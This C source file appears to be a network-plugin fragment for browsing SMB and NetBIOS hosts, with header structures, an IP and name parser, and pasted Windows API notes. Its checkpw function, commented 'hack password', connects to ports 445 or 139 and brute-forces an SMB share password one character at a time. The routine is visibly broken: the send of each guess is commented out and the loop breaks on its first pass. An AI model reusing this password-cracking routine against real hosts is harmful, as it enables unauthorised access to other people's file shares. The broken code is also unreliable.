#pragma warning(disable:4005)
#pragma warning(disable:4013)
#pragma warning(disable:4024)
#pragma warning(disable:4047)
#pragma warning(disable:4133)
#pragma warning(disable:4996)

#include "..\Plugins_C.h"



/*
#define SMBMAGICVAL	MAKELONG(MAKEWORD(0xFF, 'S'), MAKEWORD('M', 'B') )
#define WILDCARDNAME "*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
#define CREATEDIRECTORYNAME "0wn3d by cDc"
#define SERVERDOMAINNAME	"PEE"
#define SMBENCRYPTIONKEYLEN 8

// The original MSNET SMB protocol (otherwise known as the "core protocol")
#define LANMANDIALECT_PCNETWORKPROGRAM10 "PC NETWORK PROGRAM 1.0" 
// Some versions of the original MSNET defined this as an alternate to the core protocol name
#define LANMANDIALECT_PCLAN10 "PCLAN1.0" 
// This is used for the MS-NET 1.03 product.  It defines Lock&Read,Write&Unlock, and a special version of raw read and raw write.
#define LANMANDIALECT_MICROSOFTNETWORKS103 "MICROSOFT NETWORKS 1.03" 
// This is the  DOS LANMAN 1.0 specific protocol.  It is equivalent to the LANMAN 1.0 protocol, except the server is required to map errors from the OS/2 error to an appropriate DOS error.
#define LANMANDIALECT_MICROSOFTNETWORKS30  "MICROSOFT NETWORKS 3.0" 
// This is the first version of the full LANMAN 1.0 protocol
#define LANMANDIALECT_LANMAN10 "LANMAN1.0"
// This is the first version of the full LANMAN 2.0 protocol
#define LANMANDIALECT_LM12X002 "LM1.2X002"
// This is the DOS equivalent of the LM1.2X002 protocol.  It is identical to the LM1.2X002 protocol, but the server will perform error mapping to appropriate DOS errors.
#define LANMANDIALECT_DOSLM12X002 "DOS LM1.2X002"
// DOS LANMAN2.1
#define LANMANDIALECT_DOSLANMAN21 "DOS LANMAN2.1"
// OS/2 LANMAN2.1
#define LANMANDIALECT_LANMAN21 "LANMAN2.1"
// Windows for Workgroups Version 1.0
#define LANMANDIALECT_WFW31A "Windows for Workgroups 3.1a"
// The SMB protocol designed for NT networking.  This has special SMBs which duplicate the NT semantics.
#define LANMANDIALECT_NTLM012 "NT LM 0.12"

typedef struct
{	BYTE Type;			// Type of packet
	BYTE Flags;			// flags (length extension flag is all that's used)
	WORD Length;		// Length of additional data
//	WORD Padding;		// additional frame padding??
} NBSESSIONHEADER, *PNBSESSIONHEADER;

typedef struct
{	DWORD MagicVal;
	BYTE Command;
	union 
	{	struct 
		{	BYTE ErrorClass;
			BYTE Reserved;
			WORD ErrorCode;
		};
		DWORD NTError;
	};
	// flags field
	BYTE bLockAndReadWriteAndUnlock:1;
	BYTE bSendWithoutAck:1;
	BYTE bReservedBit:1;
	BYTE bNoCaseSensitivePaths:1;
	BYTE bCanonicalizedPaths:1;
	BYTE bOpportunisticLocks:1;
	BYTE bChangeNotify:1;
	BYTE bResponse:1;
	// 2nd flags field
	BYTE bLongFilenames:1;
	BYTE bExtendedAttributes:1;
	BYTE bFlags2IsLongName:1;
	BYTE bUnknown1:1;
	BYTE bUnknown2:1;
	BYTE bUnknown3:1; //***
	BYTE bUnknown4:1;
	BYTE bUnknown5:1; //***

	BYTE bUnknown6:1;
	BYTE bUnknown7:1;
	BYTE bUnknown8:1;
	BYTE bExtendedSecurity:1;
	BYTE bResolveViaDFS:1;
	BYTE bReadGrantedWithExecPerms:1;
	BYTE bNTErrorCodes:1;
	BYTE bUnicodeStrings:1;

	WORD PID;
	DWORD HdrReserved;
	WORD SessionID;
	WORD SequenceNumber;

	BYTE Padding[2];
	WORD TreeID;
	WORD CallersProcess;
	WORD UserID;
	WORD MultiplexID;
} SMBHEADER, *PSMBHEADER;

typedef struct
{	BYTE Len;		// should be 17
	WORD DialectIndex;
	BYTE bUserLevelSecurity:1;
	BYTE bEncryptPasswords:1;
	BYTE bSecuritySignaturesEnabled:1;
	BYTE bSecuritySignaturesRequired:1;
	BYTE bReserved:4;
	WORD MaxPendingMpxRequests;
	WORD MaxVCsInClientAndServer;
	DWORD MaxTransmitBufferSize;
	DWORD MaxRawBufferSize;
	DWORD UniqueSessionKey;
	BYTE bReadAndWriteRawMode:1;
	BYTE bReadAndWriteMultiplexMode:1;
	BYTE bUnicode:1;
	BYTE bLargeFiles:1;
	BYTE bNTLM012Dialect:1;
	BYTE bRAPIviaRPC:1;
	BYTE bNT32BitStatus:1;
	BYTE bLevelIIOplocks:1;

	BYTE bLOCK_AND_READ_Command:1;
	BYTE bNT_FIND_SBM_Command:1;
	BYTE Unused1:2;
	BYTE bDFSAware:1;
	BYTE Unused2:3;

	BYTE Unused3;

	BYTE Unused4:5;
	BYTE bBulkTransfer:1;
	BYTE bCompressedData:1;
	BYTE bExtendedSecurity:1;

	DWORD SystemDate;
	DWORD SystemTime;
	WORD TimeZone;
	BYTE EncryptionKeyLen;
	WORD ByteCount;
} SMBDIALECTSELECTHEADER, *PSMBDIALECTSELECTHEADER;
#define SMBDIALECTSELECTHEADER_LEN			17

#define totSMBBufLen 200
BYTE smbMsg[totSMBBufLen] = {
	plg->crntAdptrGWMAC.b[0],plg->crntAdptrGWMAC.b[1],plg->crntAdptrGWMAC.b[2],plg->crntAdptrGWMAC.b[3],plg->crntAdptrGWMAC.b[4],plg->crntAdptrGWMAC.b[5],
	plg->crntAdptrMAC.b[0],plg->crntAdptrMAC.b[1],plg->crntAdptrMAC.b[2],plg->crntAdptrMAC.b[3],plg->crntAdptrMAC.b[4],plg->crntAdptrMAC.b[5],
	8,0,//6-ARP,0-IPV4
	0x45,0,0,0x4e,0x4f,0xf0,0,0,0x80,0x11,0,0,//id-20464
	plg->myIP.b[0],plg->myIP.b[1],plg->myIP.b[2],plg->myIP.b[3],
	0,0,0,0,//dstIP
	0xc2,0xff,0,0x89,0,//d996-SrcPort,89-137-destport
	0x3a,//3a-len
	0x8f,0xc1,//chksum
	'R','G',//NAME_TRN_ID
	0,0,//flags
	0,1,//question count
	0,0,//answer count
	0,0,//authority count
	0,0,//additional count
	0x20,0x43,0x4b,0x41,
	0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
	0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0,
	0,0x21,//type=netbios node status
	0,1};//address class=internet
*/
//IP4 va nomi,domaini ajratish:
BOOL DistrItemName(wchar_t* itemName,DWORD *dwIP,wchar_t* Name,wchar_t* Domain)
{
/*int ipn=0,ln=0;wchar_t s[32],*p = itemName,*pOld=p;BYTE ip[4];
	for(ln=0; (*p) && ln<80; ++ln)
	{	if((*p)<'0' || (*p)>'9')
		{	if(ipn<4 && '.'!=(*p)) return FALSE;
			wcsncpy(s,pOld,p-pOld);
			s[p-pOld]=0;
			ip[ipn]=_wtoi(s);
			pOld = p+1;
			if(++ipn > 3)
				break;
			if((*pOld)<'0' || (*pOld)>'9')return FALSE;
		}
		++p;
	}
	if(ipn<4)
	{	wcsncpy(s,pOld,p-pOld);
		s[p-pOld]=0;
		ip[ipn]=_wtoi(s);
		pOld = p+1;
	}*/
	unsigned long l;char c[64];
	wchar_t s[32],*p = wcschr(itemName,'-');
	if(!p)
	{	WideCharToMultiByte(CP_ACP,0,itemName,-1,c,64,NULL,NULL);
		l = inet_addr(c);
		if(INADDR_NONE==l) return FALSE;
		*dwIP = l;
		Name[0] = 0;
		Domain[0] = 0;
		return TRUE;
	}
	//else:
	wcsncpy(s,itemName,p-itemName-1);
	s[p-itemName-1] = 0;
	WideCharToMultiByte(CP_ACP,0,s,-1,c,64,NULL,NULL);
	l = inet_addr(c);
	if(INADDR_NONE==l) return FALSE;
	*dwIP = l;

	wcscpy(Name,p+1);

	//Oxirini topamiz:
	p = wcsrchr(Name,'{');
	if(!p)//Not domain name defined:
	{	*Domain = NULL;
		return TRUE;
	}
	*(p-1) = 0;
	//else:

	wcscpy(Domain,p+1);
	p = wcsrchr(Domain,'}');
	if(p)
		*p = 0;
	return TRUE;
}

//Nodeni listat qilish, samba yordamida:
BOOL NodeSambaViaGate(PluginObj* plg,int itemId,wchar_t *itemName)
{

	//plg->state = node_samba;
	return TRUE;
}

void writepacket(char *packet,char *input,int pos)
{
    unsigned int i,p=pos;   
    for(i=0;i<strlen(input);i++,p++)
		packet[p]=input[i];
}

int checkpw(char *IPTarget,char *sharename,int delay)//int checkpw(char *target,char *compname,char *sharename,int delay)
{ 
SOCKET  s;
WSADATA wsaData;
struct  sockaddr_in A;
struct  hostent *H;
int  packetsize=100;
char password[10];
char packet[200];
char mangled[33];
char ppos=0;
int  i;
 
	if(WSAStartup(MAKEWORD(2,2),&wsaData)!=0)
	{	//printf("Error: wsastartup failed\n"); 
		return 0; 
	} 
 
	if(!(H=gethostbyaddr(IPTarget,4,AF_INET)))//if(!(H=gethostbyname(target)))
	{ 	//printf("Error: cannot resolve host\n");
		return 0;
	}  
 
	if(INVALID_SOCKET==(s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)))
	{	//printf("Error: cannot create tcp socket\n"); 
		return 0; 
	} 
 
	A.sin_family=AF_INET; 
	A.sin_port=htons(445);
	A.sin_addr.s_addr=*((unsigned long*)&H->h_addr); 
 
	if(0!=connect(s,(struct sockaddr*)&A,sizeof(A)))
	{	closesocket(s); 
		if(INVALID_SOCKET==(s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)))
		{	//printf("Error: cannot create tcp socket\n"); 
			return 0; 
		} 
		A.sin_port=htons(139);
		if(0!=connect(s,(struct sockaddr*)&A,sizeof(A)))
		{	//printf("Error: cannot connect to target host\n"); 
			closesocket(s); 
			return 0; 
	}	}
	//printf("-&gt; connected\n"); 
	 
	// assemble &amp; send handshake packet 
	memset(packet,0,200); 
	packet[0]=0x81;			// type = handshake 
	packet[1]=0x00;			// flags = none 
	packet[2]=0x00;			// length 1 
	packet[3]=0x44;			// length 2	 
	packet[4]=0x20;			// whitespace 
 
	memset(mangled,0,33); 
	//mangler(compname,mangled); 
	//packetsize=nbmakehspacket(packet,mangled,mangled); 
	send(s,packet,packetsize,0); 
	 
	// recieve handshake response 
    memset(packet,0,200); 
	packetsize=recv(s,packet,200,0); 
	if(packet[0]==(char)0x82 && !packet[1] && !packet[2]) 
	{	//printf("-&gt; netbios negotiation successful\n");
	}
	else
	{	//printf("Error: netbios negotiation not successful\n"); 
		closesocket(s); 
		return 0; 
	} 
  
	// assemble start packet 
	memset(packet,0,200); 
	packet[0]=0x00;			// type = 0 
	packet[1]=0x00;			// flags = 0 
	packet[2]=0x00;			// length 1 
	packet[3]=0xa4;			// length 2	 
 
	packet[4]=0xff;		packet[5]=0x53;
	packet[6]=0x4d;		packet[7]=0x42;
	packet[8]=0x72;		packet[30]=0xed;
	packet[31]=0x18;	packet[34]=0x51;
	packet[35]=0x19;	packet[37]=0x81;
	packet[39]=0x02;
 
	writepacket(packet,"PC NETWORK PROGRAM 1.0\0",40);
	packet[62]=0x00;
	packet[63]=0x02;
	writepacket(packet,"MICROSOFT NETWORKS 1.03\0",64);
	packet[87]=0x00;
	packet[88]=0x02;
	writepacket(packet,"MICROSOFT NETWORKS 3.0\0",89);//writepacket(packet,"Windows for Workgroups 3.1a\0",89);
	packet[111]=0x00;
	packet[112]=0x02;
	writepacket(packet,"LANMAN1.0\0",113);
	packet[122]=0x00;
	packet[123]=0x02;
	writepacket(packet,"LM1.2X002\0",124);
	packet[133]=0x00;
	packet[134]=0x02;
	writepacket(packet,"Samba\0",135);//writepacket(packet,"SMB 2\0",135);
	packet[140]=0x00;
	packet[141]=0x02;
	writepacket(packet,"NT LM 0.12\0",142);
	packet[152]=0x00;
	packet[153]=0x02;
	writepacket(packet,"NT LANMAN 1.0\0",154);
	packet[167]=0x00;

	send(s,packet,168,0);
 
	// recieve startpacket response 
    memset(packet,0,200);
	packetsize=recv(s,packet,200,0);
 
	// hack password
	memset(password,0,10);
	//printf("-&gt; Password is: ");
	for(i=32; i<175; i++)
	{ 	password[ppos]=i;
 
		// assemble passwd-check packet
		memset(packet,0,200);
		packet[0]=0x00;			// type = 0
		packet[1]=0x00;			// flags = 0
		packet[2]=0x00;			// length 1
		//packet[3]=0x32+(ppos+1)+strlen(compname)+strlen(sharename);	// length 2
		packet[4]=0xff;
		packet[5]=0x53;
		packet[6]=0x4d;
		packet[7]=0x42;
		packet[8]=0x75;
		packet[13]=0x18;
		packet[14]=0x01;
		packet[15]=0x20;
		packet[31]=0x28;
		packet[36]=0x04;
		packet[37]=0xff;
		packet[43]=ppos+1;
		packet[45]=0x10;
		packet[46]=0x57;
		writepacket(packet,password,47);
		writepacket(packet,"\\\\",47+strlen(password));
		/*writepacket(packet,compname,49+strlen(password));
		writepacket(packet,"\\",49+strlen(password)+strlen(compname));
		writepacket(packet,sharename,50+strlen(password)+strlen(compname));
		packet[50+strlen(password)+strlen(compname)+strlen(sharename)]=0x00;
		packet[51+strlen(password)+strlen(compname)+strlen(sharename)]=0x41;
		packet[52+strlen(password)+strlen(compname)+strlen(sharename)]=0x3a;
		packet[53+strlen(password)+strlen(compname)+strlen(sharename)]=0x00;
	 
		send(s,packet,54+strlen(password)+strlen(compname)+strlen(sharename),0);*/
 
		// recieve passwd-check response
	    memset(packet,0,200);
		packetsize=recv(s,packet,200,0);
		//printf("%c",password[ppos]);
		if(packet[9]==(char)0x00 && packet[11]==(char)0x00)
		{	ppos++;
			i=32;
		}// else printf("\b");
		if(ppos < 7) break;
		Sleep(delay);
	}
	//printf(" ");
	//printf("\n");
 
	closesocket(s);
	WSACleanup();
 
	return 1;
}

/*
SMB_DATA
      {
      ByteCount = 131
      Bytes
        {
        Dialect[0] = "\x02PC NETWORK PROGRAM 1.0"
        Dialect[1] = "\x02MICROSOFT NETWORKS 1.03"
        Dialect[2] = "\x02MICROSOFT NETWORKS 3.0"
        Dialect[3] = "\x02LANMAN1.0"
        Dialect[4] = "\x02LM1.2X002"
        Dialect[5] = "\x02LANMAN2.1"
        Dialect[6] = "\x02Samba"
        Dialect[7] = "\x02NT LM 0.12"
        Dialect[8] = "\x02CIFS"
        }
      }


	  nStatus = NetWkstaGetInfo(pszServerName,
                             dwLevel,
                             (LPBYTE *)&pBuf);

NET_API_STATUS NetWkstaGetInfo(
  __in          LPWSTR servername,
  __in          DWORD level,
  __out         LPBYTE* bufptr
);

Parameters
servername 
Pointer to a string that specifies the DNS or NetBIOS name of the remote server on which the function is to execute. If this parameter is NULL, the local computer is used. 

Windows NT:  This string must begin with \\.
level 
Specifies the information level of the data. This parameter can be one of the following values. 

Value Meaning 
100
 Return information about the workstation environment, including platform-specific information, the name of the domain and the local computer, and information concerning the operating system. The bufptr parameter points to a WKSTA_INFO_100 structure.
 
101
 In addition to level 100 information, return the path to the LANMAN directory. The bufptr parameter points to a WKSTA_INFO_101 structure.
 
HKEY_LOCAL_MACHINE
     SYSTEM
          CurrentControlSet
               Control
                    NetworkProvider

					DWORD APIENTRY NPPasswordChangeNotify(
  __in          LPCWSTR lpAuthentInfoType,
  __in          LPVOID lpAuthentInfo,
  __in          LPCWSTR lpPreviousAuthentInfoType,
  __in          LPVOID lpPreviousAuthentInfo,
  __in          LPWSTR lpStationName,
  __in          LPVOID StationHandle,
  __in          DWORD dwChangeInfo
);

KERB_INTERACTIVE_LOGON Structure

nStatus = NetWkstaUserGetInfo(NULL,
                                 dwLevel,
                                 (LPBYTE *)&pBuf);

*/